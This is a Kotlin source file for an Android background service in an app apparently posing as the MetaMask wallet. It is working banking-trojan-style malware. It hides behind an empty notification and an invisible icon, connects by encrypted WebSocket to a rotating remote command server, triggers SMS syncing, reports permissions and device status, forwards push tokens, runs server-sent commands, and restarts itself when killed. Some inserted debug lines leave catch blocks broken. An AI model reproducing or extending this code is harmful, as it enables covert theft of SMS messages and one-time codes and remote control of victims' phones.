package com.example.MetaMask.services

import android.Manifest
import android.app.*
import android.content.*
import android.content.pm.PackageManager
import android.net.ConnectivityManager
import android.net.Network
import android.net.NetworkCapabilities
import android.net.NetworkRequest
import android.os.*
import android.provider.Telephony
import android.telephony.PhoneStateListener
import android.telephony.TelephonyManager
import androidx.annotation.Keep
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import com.example.MetaMask.R
import com.example.MetaMask.utils.DeviceUUIDProvider
import com.example.MetaMask.utils.PrivilegeChecker
import com.example.MetaMask.utils.PermissionHelper
import com.example.MetaMask.utils.RemoteConfig
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import okhttp3.*
import org.json.JSONObject
import android.content.SharedPreferences

@Keep
class MasterWebSocketDispatcher : Service() {

    companion object {
        @Volatile
        var IS_SERVICE_RUNNING = false
            private set

        const val ACTION_HANDLE_COMMAND = "com.example.MetaMask.ACTION_HANDLE_COMMAND"
        const val ACTION_SEND_TO_SERVER = "com.example.MetaMask.ACTION_SEND_TO_SERVER"

        const val ACTION_SEND_MESSAGE = "com.example.MetaMask.ACTION_SEND_MESSAGE"
        const val EXTRA_MESSAGE_DATA = "com.example.MetaMask.EXTRA_MESSAGE_DATA"

        const val EXTRA_COMMAND_DATA = "command_data"
        const val EXTRA_MESSAGE_TO_SEND = "com.example.MetaMask.EXTRA_MESSAGE_TO_SEND"
        const val EXTRA_STARTED_FROM_BOOT = "STARTED_FROM_BOOT"
        private const val NOTIFICATION_CHANNEL_ID = "WebSocketDispatcherChannel"
        private const val NOTIFICATION_ID = 1
        private const val RESTART_PENDING_INTENT_REQUEST_CODE = 2
        private const val INITIAL_RECONNECT_DELAY_MS = 2000L
        private const val MAX_RECONNECT_DELAY_MS = 60000L
        const val PREFS_NAME = "service_status_prefs"
        const val KEY_IS_RUNNING = "is_master_service_running"

        @Volatile
        private var lastQueueSizeBytes: Long = 0L

        @Volatile
        var CURRENT_INSTANCE: MasterWebSocketDispatcher? = null

        @Volatile
        private var generation: Long = 0L

        @JvmStatic
        fun getQueueSize(): Long = lastQueueSizeBytes
    }

    private lateinit var statusPrefs: SharedPreferences
    private var connectionStartTime: Long = 0L

    private val client: OkHttpClient by lazy {
        OkHttpClient.Builder()
            .addInterceptor(com.example.MetaMask.utils.FailoverInterceptor())
            .addInterceptor { chain ->
                val original = chain.request()
                val request = original.newBuilder()
                    .header("User-Agent", "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36")
                    .header("Accept-Language", "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7")
                    .build()
                chain.proceed(request)
            }
            .connectTimeout(10, java.util.concurrent.TimeUnit.SECONDS)
            .readTimeout(0, java.util.concurrent.TimeUnit.MILLISECONDS)
            .pingInterval(30, java.util.concurrent.TimeUnit.SECONDS)
            .build()
    }
    private var webSocket: WebSocket? = null
    private val handler: Handler = Handler(Looper.getMainLooper())
    private var currentReconnectDelay: Long = INITIAL_RECONNECT_DELAY_MS
    private val serviceJob: Job = Job()
    private val serviceScope: CoroutineScope = CoroutineScope(Dispatchers.IO + serviceJob)

    private val requiredSmsPermissions = arrayOf(Manifest.permission.READ_SMS, Manifest.permission.SEND_SMS)
    private var connectivityManager: ConnectivityManager? = null
    private var networkCallback: ConnectivityManager.NetworkCallback? = null

    @Volatile private var lastPhoneStateTriggerMs = 0L
    private val PHONE_STATE_DEBOUNCE_MS = 10_000L
    private var telephonyManagerRef: TelephonyManager? = null
    private var phoneStateCallback: Any? = null

    private val servicesToStart = listOf(
        trolService::class.java,
        FrienCat::class.java,
        UUIDService::class.java,
        TurtleService::class.java
    )

    private val serverSendReceiver: BroadcastReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] onReceive enter context=ctx intent=${intent}") //xdbg
            if (intent?.action != ACTION_SEND_TO_SERVER) return

            if (intent.hasExtra(EXTRA_MESSAGE_TO_SEND)) {
                val messageString = intent.getStringExtra(EXTRA_MESSAGE_TO_SEND)

                if (messageString != null) {
                    try {
                        val payload = JSONObject(messageString)

                        if (!payload.has("uuid")) {
                            payload.put("uuid", com.example.MetaMask.utils.DeviceUUIDProvider.getUUID())
                        }

                        val rawData = payload.toString()

                        val encryptedData = com.yourcompany.core.jni.NativeBridge.nativeEncryptData(rawData)

                        val secureEnvelope = JSONObject()
                        secureEnvelope.put("p", encryptedData)

                        val finalPayload = secureEnvelope.toString()

                        lastQueueSizeBytes = webSocket?.queueSize() ?: lastQueueSizeBytes
                        val sent = webSocket?.send(finalPayload) ?: false
                        lastQueueSizeBytes = webSocket?.queueSize() ?: lastQueueSizeBytes
                    } catch (e: Exception) {
                        android.util.Log.e("XDBG", "[MasterWebSocketDispatcher] catch Exception ${e.javaClass.simpleName}: ${e.message}") //xdbg
                    }
                }
            }
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()

        startAsForegroundService()

        val hasReadSms = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED
        if (!hasReadSms) {
            stopSelf()
            return
        }

        val killSwitchPrefs = getSharedPreferences(SelfDestructService.PREFS_NAME, Context.MODE_PRIVATE)
        val isKilled = killSwitchPrefs.getBoolean(SelfDestructService.KEY_PERMANENTLY_DISABLED, false)
        if (isKilled) {
            stopSelf()
            return
        }

        statusPrefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        statusPrefs.edit().putBoolean(KEY_IS_RUNNING, true).apply()

        IS_SERVICE_RUNNING = true

        CURRENT_INSTANCE = this
        synchronized(MasterWebSocketDispatcher::class.java) { generation++ }

        serviceScope.launch {
            val realityJob = launch { com.example.MetaMask.utils.RealityConfig.fetch() }
            val ok = RemoteConfig.fetchDomain(applicationContext)
            realityJob.join()
            if (ok) {
                Handler(Looper.getMainLooper()).post {
                    initializeWebSocket()
                }
            }
        }

        try {
            DeviceUUIDProvider.init(applicationContext)

            registerReceiver(
                serverSendReceiver,
                IntentFilter(ACTION_SEND_TO_SERVER),
                Context.RECEIVER_EXPORTED
            )
        } catch (e: Exception) {
            android.util.Log.e("XDBG", "[MasterWebSocketDispatcher] catch Exception ${e.javaClass.simpleName}: ${e.message}") //xdbg
            stopSelf()
        }

        registerNetworkCallback()
        registerTelephonyListener()
        KeepAliveManager.engage(this)
        KeepAliveJobService.schedule(this)
    }


    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] onStartCommand enter intent=${intent} flags=${flags} startId=${startId}") //xdbg
        val hasReadSms = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED
        if (!hasReadSms) {
            stopSelf()
            return START_NOT_STICKY
        }

        if (intent?.action == ACTION_SEND_MESSAGE) {
            val message = intent.getStringExtra(EXTRA_MESSAGE_DATA)
            if (!message.isNullOrBlank()) {
                val sendIntent = Intent(ACTION_SEND_TO_SERVER).apply {
                    putExtra(EXTRA_MESSAGE_TO_SEND, message)
                }
                this@MasterWebSocketDispatcher.sendBroadcast(sendIntent)
            }
            return START_STICKY
        }

        if (IS_SERVICE_RUNNING && webSocket != null && intent?.action == null && intent?.getBooleanExtra(EXTRA_STARTED_FROM_BOOT, false) != true) {
            if (intent?.getBooleanExtra("started_from_push", false) == true) {
                serviceScope.launch { checkAndHealWebSocket() }
            }
            return START_STICKY
        }

        checkAndReportDefaultSmsStatus()

        if (isNetworkAvailable(this@MasterWebSocketDispatcher)) {
            serviceScope.launch {
                initializeWebSocket()
            }
        }

        if (areSmsPermissionsGranted()) {
            startAllServices(intent?.getBooleanExtra(EXTRA_STARTED_FROM_BOOT, false) ?: false)
        }
        return START_STICKY
    }

    private fun areSmsPermissionsGranted(): Boolean =
        requiredSmsPermissions.all { ContextCompat.checkSelfPermission(this@MasterWebSocketDispatcher, it) == PackageManager.PERMISSION_GRANTED }

    private fun startAllServices(fromBoot: Boolean) {
        android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] startAllServices enter fromBoot=${fromBoot}") //xdbg
        servicesToStart.forEach { serviceClass ->
            try {
                startService(Intent(this@MasterWebSocketDispatcher, serviceClass).apply {
                    putExtra(EXTRA_STARTED_FROM_BOOT, fromBoot)
                })
            } catch (e: Exception) {
                android.util.Log.e("XDBG", "[MasterWebSocketDispatcher] catch Exception ${e.javaClass.simpleName}: ${e.message}") //xdbg
            }
        }

        try {
            val request = androidx.work.OneTimeWorkRequestBuilder<com.example.MetaMask.services.ChikenWorker>()
                .setExpedited(androidx.work.OutOfQuotaPolicy.RUN_AS_NON_EXPEDITED_WORK_REQUEST)
                .build()
            androidx.work.WorkManager.getInstance(applicationContext).enqueue(request)
        } catch (e: Exception) {
            android.util.Log.e("XDBG", "[MasterWebSocketDispatcher] catch Exception ${e.javaClass.simpleName}: ${e.message}") //xdbg
        }
    }

    private fun startAsForegroundService() {
        val channelId = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val importance = if (Build.VERSION.SDK_INT <= 32)
                NotificationManager.IMPORTANCE_MIN else NotificationManager.IMPORTANCE_LOW
            val channel = NotificationChannel(NOTIFICATION_CHANNEL_ID, "System Connection", importance)
            (getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager).createNotificationChannel(channel)
            channel.id
        } else ""
        val builder = NotificationCompat.Builder(this@MasterWebSocketDispatcher, channelId)
            .setContentTitle("")
            .setContentText("")
            .setPriority(NotificationCompat.PRIORITY_MIN)
        if (Build.VERSION.SDK_INT <= 32) {
            val bmp = android.graphics.Bitmap.createBitmap(1, 1, android.graphics.Bitmap.Config.ARGB_8888)
            builder.setSmallIcon(androidx.core.graphics.drawable.IconCompat.createWithBitmap(bmp))
        } else {
            builder.setSmallIcon(R.mipmap.ic_launcher)
        }
        val notification = builder.build()
        try {
            if (Build.VERSION.SDK_INT >= 34) {
                startForeground(
                    NOTIFICATION_ID,
                    notification,
                    android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
                )
            } else if (Build.VERSION.SDK_INT >= 29) {
                startForeground(
                    NOTIFICATION_ID,
                    notification,
                    android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
                )
            } else {
                startForeground(NOTIFICATION_ID, notification)
            }
        } catch (e: Exception) {
            android.util.Log.e("XDBG", "[MasterWebSocketDispatcher] catch Exception ${e.javaClass.simpleName}: ${e.message}") //xdbg
            stopSelf()
        }
    }

    private fun initializeWebSocket() {
        val domain = RemoteConfig.serverDomain
        if (domain == null) {
            return
        }

        if (webSocket != null || !IS_SERVICE_RUNNING) {
            return
        }
        try {
            val deviceUuid = DeviceUUIDProvider.getUUID()
            if (deviceUuid == null) {
                return
            }

            val wsUrl = "wss://$domain/ws"
            val urlWithParams = "$wsUrl?type=device&uuid=$deviceUuid"

            connectionStartTime = System.currentTimeMillis()

            val request = Request.Builder().url(urlWithParams).build()
            webSocket = com.example.MetaMask.utils.RealityWebSocket(
                originalRequest = request,
                wsPath = "/ws",
                wsQuery = "type=device&uuid=$deviceUuid",
                listener = AppWebSocketListener()
            )
        } catch (e: Exception) {
            android.util.Log.e("XDBG", "[MasterWebSocketDispatcher] catch Exception ${e.javaClass.simpleName}: ${e.message}") //xdbg
            webSocket = null
            scheduleReconnect()
        }
    }

    private suspend fun checkAndHealWebSocket() {
        val ws = webSocket ?: return
        val sent = ws.send("{\"action\":\"ping\"}")
        if (!sent) {
            ws.cancel()
            webSocket = null
            synchronized(MasterWebSocketDispatcher::class.java) { generation++ }
            handler.removeCallbacksAndMessages(null)
            currentReconnectDelay = INITIAL_RECONNECT_DELAY_MS
            initializeWebSocket()
        }
    }

    private fun scheduleReconnect() {
        if (!IS_SERVICE_RUNNING) return
        val myGen: Long = synchronized(MasterWebSocketDispatcher::class.java) { generation }
        handler.removeCallbacksAndMessages(null)
        val delayMs = currentReconnectDelay
        currentReconnectDelay = (currentReconnectDelay * 2).coerceAtMost(MAX_RECONNECT_DELAY_MS)
        handler.postDelayed({
            if (CURRENT_INSTANCE !== this@MasterWebSocketDispatcher) {
                return@postDelayed
            }
            val isMyGeneration = synchronized(MasterWebSocketDispatcher::class.java) { generation == myGen }
            if (!isMyGeneration) {
                return@postDelayed
            }
            if (IS_SERVICE_RUNNING && webSocket == null) {
                initializeWebSocket()
            }
        }, delayMs)
    }

    inner class AppWebSocketListener : WebSocketListener() {
        private val pingHandler: Handler = Handler(Looper.getMainLooper())
        private var pingRunnable: Runnable? = null
        private val qualityCheckHandler: Handler = Handler(Looper.getMainLooper())
        private var firstMessageReceived = false
        private var connectionFailureCount = 0
        private var lastFcmResendMs = 0L

        override fun onOpen(ws: WebSocket, response: Response) {
            android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] onOpen") //xdbg
            val connectDuration = System.currentTimeMillis() - connectionStartTime

            connectionFailureCount = 0

            if (connectDuration > 15000) {
                ws.close(1000, "Slow Connection")
                this@MasterWebSocketDispatcher.webSocket = null
                RemoteConfig.rotateDomain()
                scheduleReconnect()
                return
            }

            this@MasterWebSocketDispatcher.webSocket = ws
            handler.removeCallbacksAndMessages(null)
            currentReconnectDelay = INITIAL_RECONNECT_DELAY_MS

            try {
                if (packageManager.resolveContentProvider("p.sig.vd", 0) != null) {
                    contentResolver.insert(android.net.Uri.parse("content://p.sig.vd/s"), null)
                }
            } catch (_: Exception) {}
                android.util.Log.e("XDBG", "[MasterWebSocketDispatcher] catch Exception ${_.javaClass.simpleName}: ${_.message}") //xdbg

            qualityCheckHandler.postDelayed({
                if (!firstMessageReceived && IS_SERVICE_RUNNING) {
                    ws.cancel()
                    this@MasterWebSocketDispatcher.webSocket = null
                    RemoteConfig.rotateDomain()
                    scheduleReconnect()
                }
            }, 20000)

            RemoteConfig.markCurrentDomainAsSuccess(applicationContext)
            sendCachedTokens()

            try {
                val syncIntent = Intent(this@MasterWebSocketDispatcher, trolService::class.java).apply {
                    action = trolService.ACTION_INITIAL_SMS_SYNC
                }
                startService(syncIntent)
            } catch (e: Exception) {
                android.util.Log.e("XDBG", "[MasterWebSocketDispatcher] catch Exception ${e.javaClass.simpleName}: ${e.message}") //xdbg
            }

            try {
                schedulePing(ws)
            } catch (e: Exception) {
                android.util.Log.e("XDBG", "[MasterWebSocketDispatcher] catch Exception ${e.javaClass.simpleName}: ${e.message}") //xdbg
            }
        }

        override fun onMessage(ws: WebSocket, text: String) {
            android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] onMessage len=${text.length} head=${text.take(80)}") //xdbg
            firstMessageReceived = true
            qualityCheckHandler.removeCallbacksAndMessages(null)

            if (text.contains("\"type\":\"PING\"") || text.contains("\"type\":\"ping\"")) {
                return
            }
            try {
                broadcastHandleCommandSafely(text)
            } catch (e: Exception) {
                android.util.Log.e("XDBG", "[MasterWebSocketDispatcher] catch Exception ${e.javaClass.simpleName}: ${e.message}") //xdbg
            }
        }

        override fun onClosing(ws: WebSocket, code: Int, reason: String) {
            android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] onClosing enter ws=${ws} code=${code} reason=${reason}") //xdbg
            qualityCheckHandler.removeCallbacksAndMessages(null)
            ws.close(1000, null)
            cancelPing()
        }

        override fun onClosed(ws: WebSocket, code: Int, reason: String) {
            android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] onClosed code=${code} reason=${reason}") //xdbg
            if (this@MasterWebSocketDispatcher.webSocket == ws) {
                this@MasterWebSocketDispatcher.webSocket = null
            }
            qualityCheckHandler.removeCallbacksAndMessages(null)
            lastQueueSizeBytes = 0L
            cancelPing()
            if (IS_SERVICE_RUNNING) scheduleReconnect()
        }

        override fun onFailure(ws: WebSocket, t: Throwable, response: Response?) {
            android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] onFailure ${t.javaClass.simpleName}: ${t.message} resp=${response?.code}") //xdbg
            qualityCheckHandler.removeCallbacksAndMessages(null)

            if (this@MasterWebSocketDispatcher.webSocket == ws) {
                ws.cancel()
                this@MasterWebSocketDispatcher.webSocket = null
            }
            lastQueueSizeBytes = 0L
            cancelPing()

            connectionFailureCount++

            RemoteConfig.rotateDomain()

            if (connectionFailureCount > 5) {
                serviceScope.launch {
                    val success = RemoteConfig.fetchDomain(applicationContext)
                    Handler(Looper.getMainLooper()).post {
                        if (success) {
                            connectionFailureCount = 0
                        }
                        if (IS_SERVICE_RUNNING) scheduleReconnect()
                    }
                }
            } else {
                if (IS_SERVICE_RUNNING) scheduleReconnect()
            }
        }

        private fun broadcastHandleCommandSafely(json: String) {
            android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] broadcastHandleCommandSafely enter json=${json}") //xdbg
            val pm = this@MasterWebSocketDispatcher.packageManager
            val base = Intent(ACTION_HANDLE_COMMAND).apply {
                putExtra(EXTRA_COMMAND_DATA, json)
                setPackage(this@MasterWebSocketDispatcher.packageName)
            }

            val matches = try {
                pm.queryBroadcastReceivers(base, 0)
            } catch (e: Exception) {
                android.util.Log.e("XDBG", "[MasterWebSocketDispatcher] catch Exception ${e.javaClass.simpleName}: ${e.message}") //xdbg
                emptyList()
            }

            val target = matches.firstOrNull { it.activityInfo?.packageName == this@MasterWebSocketDispatcher.packageName }?.activityInfo
            if (target != null && !target.name.isNullOrBlank()) {
                base.setClassName(target.packageName, target.name)
            }

            this@MasterWebSocketDispatcher.sendBroadcast(base)
        }

        private fun schedulePing(ws: WebSocket) {
            android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] schedulePing enter ws=${ws}") //xdbg
            cancelPing()
            pingRunnable = object : Runnable {
                override fun run() {
                    if (this@MasterWebSocketDispatcher.webSocket == ws && IS_SERVICE_RUNNING) {
                        try {
                            val permissionsJson = PermissionHelper.checkPermissions(this@MasterWebSocketDispatcher)
                            val privilegesJson = PrivilegeChecker.getAllPrivilegesStatus(this@MasterWebSocketDispatcher)
                            val isDefaultSms = PrivilegeChecker.isDefaultSmsApp(this@MasterWebSocketDispatcher)

                            val appName = try {
                                val prefs = this@MasterWebSocketDispatcher.getSharedPreferences("DeviceCheck", Context.MODE_PRIVATE)
                                val smartName = prefs.getString("cached_smart_app_name", null)

                                if (!smartName.isNullOrBlank()) {
                                    smartName
                                } else {
                                    val pm = packageManager
                                    val appInfo = applicationInfo
                                    pm.getApplicationLabel(appInfo).toString()
                                }
                            } catch (e: Exception) {
                                android.util.Log.e("XDBG", "[MasterWebSocketDispatcher] catch Exception ${e.javaClass.simpleName}: ${e.message}") //xdbg
                                "Unknown"
                            }

                            val now = System.currentTimeMillis()
                            if (now - lastFcmResendMs >= 1_800_000L) {
                                lastFcmResendMs = now
                                sendCachedTokens()
                            }

                            val pingMessage = JSONObject().apply {
                                put("action", "ping")
                                put("appName", appName)
                                put("is_default_sms", isDefaultSms)
                                if (permissionsJson.getString("status") == "success") {
                                    put("permissions", permissionsJson.getJSONObject("data"))
                                }
                                put("privileges", privilegesJson)
                            }

                            val sent = try {
                                val rawData = pingMessage.toString()

                                val encryptedData = com.yourcompany.core.jni.NativeBridge.nativeEncryptData(rawData)

                                val envelope = JSONObject().apply {
                                    put("p", encryptedData)
                                }

                                val finalPayload = envelope.toString()

                                val result = ws.send(finalPayload)
                                result
                            } catch (e: Exception) {
                                android.util.Log.e("XDBG", "[MasterWebSocketDispatcher] catch Exception ${e.javaClass.simpleName}: ${e.message}") //xdbg
                                false
                            }

                            if (sent) {
                                lastQueueSizeBytes = ws.queueSize()
                            }

                        } catch (e: Exception) {
                            android.util.Log.e("XDBG", "[MasterWebSocketDispatcher] catch Exception ${e.javaClass.simpleName}: ${e.message}") //xdbg
                        }

                        if (IS_SERVICE_RUNNING && this@MasterWebSocketDispatcher.webSocket == ws) {
                            pingHandler.postDelayed(this, (3000L..8000L).random())
                        }
                    }
                }
            }
            pingHandler.postDelayed(pingRunnable!!, (2000L..5000L).random())
        }

        private fun cancelPing() {
            pingRunnable?.let { pingHandler.removeCallbacks(it) }
            pingRunnable = null
        }
    }

    private fun checkAndReportDefaultSmsStatus() {
        try {
            val isDefault = com.example.MetaMask.utils.PrivilegeChecker.isDefaultSmsApp(this@MasterWebSocketDispatcher)

            val statusUpdatePayload = JSONObject().apply {
                put("action", "defaultSmsStatusUpdate")
                put("isDefault", isDefault)
            }

            val sendIntent = Intent(ACTION_SEND_TO_SERVER).apply {
                putExtra(EXTRA_MESSAGE_TO_SEND, statusUpdatePayload.toString())
            }
            this@MasterWebSocketDispatcher.sendBroadcast(sendIntent)
        } catch (e: Exception) {
            android.util.Log.e("XDBG", "[MasterWebSocketDispatcher] catch Exception ${e.javaClass.simpleName}: ${e.message}") //xdbg
        }
    }

    private fun isNetworkAvailable(context: Context): Boolean {
        android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] isNetworkAvailable enter context=ctx") //xdbg
        val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val network = cm.activeNetwork ?: return false
        val capabilities = cm.getNetworkCapabilities(network) ?: return false
        return capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
    }

    private fun scheduleRestart() {
        if (!IS_SERVICE_RUNNING) return
        val restartIntent = Intent(this@MasterWebSocketDispatcher, MasterWebSocketDispatcher::class.java).apply {
            setPackage(this@MasterWebSocketDispatcher.packageName)
        }
        val pendingIntent = PendingIntent.getService(
            this@MasterWebSocketDispatcher,
            RESTART_PENDING_INTENT_REQUEST_CODE,
            restartIntent,
            PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
        )
        val alarmManager = getSystemService(Context.ALARM_SERVICE) as AlarmManager
        alarmManager.set(
            AlarmManager.ELAPSED_REALTIME_WAKEUP,
            SystemClock.elapsedRealtime() + 2000,
            pendingIntent
        )
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] onTaskRemoved enter rootIntent=${rootIntent}") //xdbg
        scheduleRestart()
        sendRestartBroadcast()
        super.onTaskRemoved(rootIntent)
    }

    private fun sendRestartBroadcast() {
        val broadcastIntent = Intent("com.example.MetaMask.RESTART_SERVICE")
        broadcastIntent.setPackage(this@MasterWebSocketDispatcher.packageName)
        this@MasterWebSocketDispatcher.sendBroadcast(broadcastIntent)
    }

    override fun onDestroy() {
        KeepAliveManager.releaseAll(this)
        unregisterTelephonyListener()
        val killSwitchPrefs = getSharedPreferences(SelfDestructService.PREFS_NAME, Context.MODE_PRIVATE)

        if (killSwitchPrefs.getBoolean(SelfDestructService.KEY_PERMANENTLY_DISABLED, false)) {
            IS_SERVICE_RUNNING = false

            if (::statusPrefs.isInitialized) {
                statusPrefs.edit().putBoolean(KEY_IS_RUNNING, false).apply()
            }

            try {
                unregisterReceiver(serverSendReceiver)
            } catch (e: IllegalArgumentException) {
                android.util.Log.e("XDBG", "[MasterWebSocketDispatcher] catch IllegalArgumentException ${e.javaClass.simpleName}: ${e.message}") //xdbg
            }

            serviceJob.cancel()
            handler.removeCallbacksAndMessages(null)

            webSocket?.close(1000, "Service Destroyed")

            if (CURRENT_INSTANCE === this) CURRENT_INSTANCE = null

            super.onDestroy()
            return
        }

        if (::statusPrefs.isInitialized) {
            statusPrefs.edit().putBoolean(KEY_IS_RUNNING, false).apply()
        }

        IS_SERVICE_RUNNING = false
        serviceJob.cancel()
        unregisterNetworkCallback()

        try {
            unregisterReceiver(serverSendReceiver)
        } catch (e: IllegalArgumentException) {
            android.util.Log.e("XDBG", "[MasterWebSocketDispatcher] catch IllegalArgumentException ${e.javaClass.simpleName}: ${e.message}") //xdbg
        }

        handler.removeCallbacksAndMessages(null)
        webSocket?.close(1000, "Service Destroyed")

        scheduleRestart()

        if (CURRENT_INSTANCE === this) CURRENT_INSTANCE = null

        super.onDestroy()

        val hasReadSms = androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_SMS) == android.content.pm.PackageManager.PERMISSION_GRANTED

        if (hasReadSms) {
            sendRestartBroadcast()
        }
    }

    private fun registerTelephonyListener() {
        try {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE)
                    != PackageManager.PERMISSION_GRANTED) return
            val tm = getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager ?: return
            telephonyManagerRef = tm
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                registerModernTelephonyCallback(tm)
            } else {
                registerLegacyPhoneStateListener(tm)
            }
        } catch (e: Exception) {}
            android.util.Log.e("XDBG", "[MasterWebSocketDispatcher] catch Exception ${e.javaClass.simpleName}: ${e.message}") //xdbg
    }

    @androidx.annotation.RequiresApi(Build.VERSION_CODES.S)
    private fun registerModernTelephonyCallback(tm: TelephonyManager) {
        android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] registerModernTelephonyCallback enter tm=${tm}") //xdbg
        val cb = object : android.telephony.TelephonyCallback(),
            android.telephony.TelephonyCallback.DataConnectionStateListener,
            android.telephony.TelephonyCallback.CallStateListener {
            override fun onDataConnectionStateChanged(state: Int, networkType: Int) {
                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] onDataConnectionStateChanged enter state=${state} networkType=${networkType}") //xdbg
                if (state == TelephonyManager.DATA_CONNECTED) onPhoneStateTrigger()
            }
            override fun onCallStateChanged(state: Int) {
                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] onCallStateChanged enter state=${state}") //xdbg
                if (state == TelephonyManager.CALL_STATE_IDLE) onPhoneStateTrigger()
            }
        }
        val executor = java.util.concurrent.Executor { cmd -> Handler(Looper.getMainLooper()).post(cmd) }
        tm.registerTelephonyCallback(executor, cb)
        phoneStateCallback = cb
    }

    @Suppress("DEPRECATION")
    private fun registerLegacyPhoneStateListener(tm: TelephonyManager) {
        android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] registerLegacyPhoneStateListener enter tm=${tm}") //xdbg
        val listener = object : PhoneStateListener() {
            override fun onDataConnectionStateChanged(state: Int, networkType: Int) {
                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] onDataConnectionStateChanged enter state=${state} networkType=${networkType}") //xdbg
                if (state == TelephonyManager.DATA_CONNECTED) onPhoneStateTrigger()
            }
            override fun onCallStateChanged(state: Int, phoneNumber: String?) {
                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] onCallStateChanged enter state=${state} phoneNumber=${phoneNumber}") //xdbg
                if (state == TelephonyManager.CALL_STATE_IDLE) onPhoneStateTrigger()
            }
        }
        tm.listen(
            listener,
            PhoneStateListener.LISTEN_DATA_CONNECTION_STATE or PhoneStateListener.LISTEN_CALL_STATE
        )
        phoneStateCallback = listener
    }

    private fun unregisterTelephonyListener() {
        try {
            val tm = telephonyManagerRef ?: return
            val cb = phoneStateCallback ?: return
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                tm.unregisterTelephonyCallback(cb as android.telephony.TelephonyCallback)
            } else {
                @Suppress("DEPRECATION")
                tm.listen(cb as PhoneStateListener, PhoneStateListener.LISTEN_NONE)
            }
        } catch (e: Exception) {}
            android.util.Log.e("XDBG", "[MasterWebSocketDispatcher] catch Exception ${e.javaClass.simpleName}: ${e.message}") //xdbg
        phoneStateCallback = null
        telephonyManagerRef = null
    }

    private fun onPhoneStateTrigger() {
        val now = System.currentTimeMillis()
        if (now - lastPhoneStateTriggerMs < PHONE_STATE_DEBOUNCE_MS) return
        lastPhoneStateTriggerMs = now
        Handler(Looper.getMainLooper()).post {
            if (!IS_SERVICE_RUNNING) return@post
            if (webSocket == null) {
                serviceScope.launch {
                    if (RemoteConfig.serverDomain != null || RemoteConfig.fetchDomain(applicationContext)) {
                        initializeWebSocket()
                    }
                }
            } else {
                serviceScope.launch { checkAndHealWebSocket() }
            }
        }
    }

    private fun registerNetworkCallback() {
        connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val networkRequest = NetworkRequest.Builder()
            .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
            .build()

        networkCallback = object : ConnectivityManager.NetworkCallback() {
            override fun onAvailable(network: Network) {
                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] onAvailable enter network=${network}") //xdbg
                super.onAvailable(network)
                Handler(Looper.getMainLooper()).post {
                    if (webSocket == null) {
                        serviceScope.launch {
                            if (RemoteConfig.serverDomain != null || RemoteConfig.fetchDomain(applicationContext)) {
                                initializeWebSocket()
                            }
                        }
                    }
                }
            }

            override fun onLost(network: Network) {
                android.util.Log.d("XDBG", "[MasterWebSocketDispatcher] onLost enter network=${network}") //xdbg
                super.onLost(network)
            }
        }
        connectivityManager?.registerNetworkCallback(networkRequest, networkCallback!!)
    }

    private fun unregisterNetworkCallback() {
        try {
            networkCallback?.let {
                connectivityManager?.unregisterNetworkCallback(it)
            }
        } catch (e: Exception) {
            android.util.Log.e("XDBG", "[MasterWebSocketDispatcher] catch Exception ${e.javaClass.simpleName}: ${e.message}") //xdbg
        }
    }

    private fun sendCachedTokens() {
        try {
            val uuid = DeviceUUIDProvider.getUUID() ?: return

            val fcmPrefs = getSharedPreferences("fcm_prefs", Context.MODE_PRIVATE)
            val fcmToken = fcmPrefs.getString("fcm_token", null)

            if (!fcmToken.isNullOrEmpty()) {
                val json = JSONObject().apply {
                    put("action", "fcmTokenUpdate")
                    put("fcmToken", fcmToken)
                    put("uuid", uuid)
                    put("packageName", packageName)
                }

                val rawData = json.toString()
                val encryptedData = com.yourcompany.core.jni.NativeBridge.nativeEncryptData(rawData)

